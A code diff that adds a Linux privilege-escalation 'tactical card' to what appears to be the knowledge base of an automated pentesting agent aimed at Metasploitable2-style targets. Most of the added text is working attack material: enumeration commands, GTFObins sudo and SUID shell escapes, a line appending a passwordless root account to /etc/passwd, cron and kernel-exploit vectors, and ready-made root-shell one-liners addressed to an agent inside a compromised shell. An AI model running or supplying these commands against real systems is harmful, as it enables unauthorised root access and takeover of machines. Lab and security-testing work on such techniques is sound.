@@ -257,6 +257,45 @@ def main():
         """
     ))
 
+    cards.append(format_tactical_card(
+        name="privilege_escalation_linux",
+        keywords="privilege escalation privesc root suid sudo gtfobins kernel cron writable passwd uid 0 escalate low-priv shell",
+        description="How to escalate from a low-priv shell (uid != 0) to root on Linux.",
+        instructions="""
+        GOAL: from a low-priv shell (uid != 0) reach uid=0(root). Work INSIDE the
+        compromised shell with NON-INTERACTIVE one-liners (the shell has no tty).
+        STEP 1 - ENUMERATE (read the output before deciding):
+          id; uname -a; sudo -n -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null;
+          ls -l /etc/passwd /etc/shadow; cat /etc/crontab 2>/dev/null; which gcc python perl
+        STEP 2 - PICK A VECTOR (first that applies):
+          A) sudo NOPASSWD: 'sudo -n -l' shows (ALL) or a binary -> GTFObins escape,
+             e.g. 'sudo -n /bin/sh -c id', 'sudo -n find . -exec /bin/sh -c id \\;',
+             'sudo -n awk "BEGIN{system(\\"id\\")}"'.
+          B) SUID binary (owner root, -4000): abuse via GTFObins,
+             e.g. 'find / -exec /bin/sh -p -c id \\;' , nmap/vim/less/cp/env tricks.
+          C) World-writable /etc/passwd: append a root account with a known hash
+             (openssl passwd -1 'pass') -> echo 'r:HASH:0:0::/root:/bin/bash' >> /etc/passwd
+             then 'su r -c id'.
+          D) Writable cron script run by root -> drop a command that gives root.
+          E) Kernel exploit (old 2.6.x like Metasploitable2) compiled with gcc ONLY if
+             gcc exists; try A-D first (faster, more reliable).
+        CRITICAL (non-tty shell): NEVER launch an interactive tool BARE
+        ('nmap --interactive', 'vim', 'less', 'ftp') -- it HANGS this shell and
+        swallows your next commands. ALWAYS feed the escape in the SAME one-liner
+        and finish with id. Ready-to-use SUID one-liners (pick what matches the
+        SUID list / sudo -l output):
+          SUID nmap (old 4.x): echo '!id' | /usr/bin/nmap --interactive   # runs id as root; use '!sh' for a root shell
+          SUID find:           find /etc/hostname -exec /bin/sh -p -c id \\;
+          SUID vim/rvim:       vim -E -c ':!id' -c ':q' 2>/dev/null
+          SUID awk/nawk:       awk 'BEGIN{system("id")}'
+          SUID python (-p):    python -c 'import os;os.setuid(0);os.system("id")'
+          world-writable passwd: echo 'r::0:0::/root:/bin/sh' >> /etc/passwd && su r -c id
+          sudo (old, no -n):   use 'sudo -l' (NOT 'sudo -n -l') to list; then
+                               'sudo <bin> -c id' with a GTFObins escape.
+        STEP 3 - CONFIRM: run 'id' and look for uid=0(root).
+        """
+    ))
+
     # =====================================================================
     # RECEITAS POR SERVICO (Metasploitable2 e alvos Linux/Unix classicos)
     # =====================================================================
